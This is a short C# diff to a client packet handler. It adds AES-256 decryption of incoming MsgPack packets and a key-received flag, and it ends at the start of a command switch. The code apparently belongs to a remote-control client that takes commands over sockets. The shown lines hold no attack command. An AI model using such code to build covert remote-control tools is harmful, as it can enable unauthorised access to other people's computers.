@@ -4,6 +4,7 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -11,12 +12,13 @@ namespace Client.Handle_Packet
 {
     public static class Packet
     {
+        public static bool KeyRecevied = false;
         public static void Read(object data)
         {
             try
             {
                 MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes((byte[])data);
+                unpack_msgpack.DecodeFromBytes(Settings.aes256.Decrypt((byte[])data));
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
                     case "sendMessage":
